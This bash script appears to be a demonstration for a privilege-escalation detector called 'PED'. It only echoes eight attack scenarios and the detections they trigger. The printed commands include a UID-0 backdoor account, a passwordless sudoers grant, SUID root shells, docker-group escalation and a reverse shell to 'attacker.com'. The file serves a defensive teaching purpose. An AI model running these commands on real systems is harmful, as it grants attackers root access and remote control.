#!/bin/bash
# Privilege Escalation Attack Simulation
# Demonstrates various privilege escalation scenarios

echo "╔══════════════════════════════════════════════════════════════════╗"
echo "║     PRIVILEGE ESCALATION ATTACK SIMULATION                      ║"
echo "║     Educational demonstration only - DO NOT use maliciously     ║"
echo "╚══════════════════════════════════════════════════════════════════╝"
echo ""

# Scenario 1: Create backdoor account with UID 0
echo "📍 Scenario 1: Creating backdoor account with root UID (UID=0)"
echo "   Attacker adds: attacker:x:0:0:Backdoor:/root:/bin/bash"
echo "   Detection: PED identifies new user with is_root_uid=True"
echo "   Severity: CRITICAL"
echo ""

# Scenario 2: Add user to sudo group
echo "📍 Scenario 2: Adding user to sudo/wheel group"
echo "   Attacker runs: usermod -aG sudo hacker"
echo "   Detection: GROUP_MEMBERSHIP_ADDED to privileged group"
echo "   Severity: HIGH"
echo ""

# Scenario 3: Modify sudoers for NOPASSWD
echo "📍 Scenario 3: Granting passwordless sudo"
echo "   Attacker adds: hacker ALL=(ALL) NOPASSWD:ALL"
echo "   Detection: SUDO_NOPASSWD_GRANTED"
echo "   Severity: CRITICAL"
echo ""

# Scenario 4: Create SUID root shell
echo "📍 Scenario 4: Creating SUID root shell"
echo "   Attacker runs: cp /bin/bash /tmp/.hidden && chmod u+s /tmp/.hidden"
echo "   Detection: NEW_SUID_SGID file detected"
echo "   Severity: CRITICAL"
echo ""

# Scenario 5: Modify existing binary to SUID
echo "📍 Scenario 5: Adding SUID bit to existing binary"
echo "   Attacker runs: chmod u+s /usr/bin/python3"
echo "   Detection: SUID_BIT_CHANGED on existing file"
echo "   Severity: CRITICAL"
echo ""

# Scenario 6: UID change attack
echo "📍 Scenario 6: Changing user UID to 0"
echo "   Attacker modifies /etc/passwd: username:x:1000:1000 → username:x:0:0"
echo "   Detection: UID_CHANGED with new_uid=0"
echo "   Severity: CRITICAL"
echo ""

# Scenario 7: Docker group privilege escalation
echo "📍 Scenario 7: Adding user to docker group"
echo "   Attacker runs: usermod -aG docker user"
echo "   Detection: GROUP_MEMBERSHIP_ADDED to docker (equivalent to root)"
echo "   Severity: HIGH"
echo "   Note: Docker group = effective root access"
echo ""

# Scenario 8: Suspicious root process
echo "📍 Scenario 8: Running suspicious command as root"
echo "   Attacker runs: bash -i >& /dev/tcp/attacker.com/4444 0>&1"
echo "   Detection: SUSPICIOUS_PROCESS (reverse shell as root)"
echo "   Severity: HIGH"
echo ""

echo "╔══════════════════════════════════════════════════════════════════╗"
echo "║                    DETECTION SUMMARY                             ║"
echo "╚══════════════════════════════════════════════════════════════════╝"
echo ""
echo "PED would detect ALL of these attacks by comparing:"
echo "  ✓ Current system state vs. baseline snapshot"
echo "  ✓ User/group membership changes"
echo "  ✓ SUID/SGID file modifications"
echo "  ✓ Sudoers configuration changes"
echo "  ✓ Running process analysis"
echo ""
echo "Typical detection time: < 5 minutes (depending on scan frequency)"
echo "Response: Alert security team, isolate affected system, investigate"
echo ""
echo "Run 'python3 ped.py --check' after each scenario to see detection!"
